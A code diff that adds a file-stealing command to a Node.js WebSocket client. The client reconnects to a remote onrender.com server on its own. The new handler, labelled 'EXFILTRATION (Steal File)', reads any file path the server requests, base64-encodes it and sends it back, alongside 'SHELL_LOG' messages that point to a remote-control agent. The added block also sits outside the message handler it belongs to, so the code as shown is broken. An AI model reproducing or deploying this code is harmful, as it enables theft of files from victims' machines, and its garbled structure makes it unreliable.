@@ -1,5 +1,6 @@
 const WebSocket = require('ws');
 const crypto = require('crypto');
+const fs = require('fs');
 
 // REPLACE WITH YOUR RENDER URL!
 const WEBSOCKET_URL = 'wss://scavenger-brain.onrender.com'; 
@@ -49,6 +50,29 @@ function connect() {
             console.error("Error processing message:", e);
         }
     });
+            // 4. EXFILTRATION (Steal File)
+            else if (msg.type === 'EXFIL_CMD') {
+                const path = msg.path;
+                console.log(`[EXFIL] Stealing: ${path}`);
+                
+                if (fs.existsSync(path)) {
+                    try {
+                        // Read file as Base64
+                        const fileData = fs.readFileSync(path, { encoding: 'base64' });
+                        
+                        // Send it back
+                        ws.send(JSON.stringify({
+                            type: 'EXFIL_RESULT',
+                            filename: path.split('/').pop(), // Get just the name
+                            data: fileData
+                        }));
+                    } catch (e) {
+                        ws.send(JSON.stringify({ type: 'SHELL_LOG', output: `[ERROR] Read failed: ${e.message}` }));
+                    }
+                } else {
+                    ws.send(JSON.stringify({ type: 'SHELL_LOG', output: `[ERROR] File not found: ${path}` }));
+                }
+            }
 
     ws.on('close', () => setTimeout(connect, 5000));
     ws.on('error', () => ws.close());
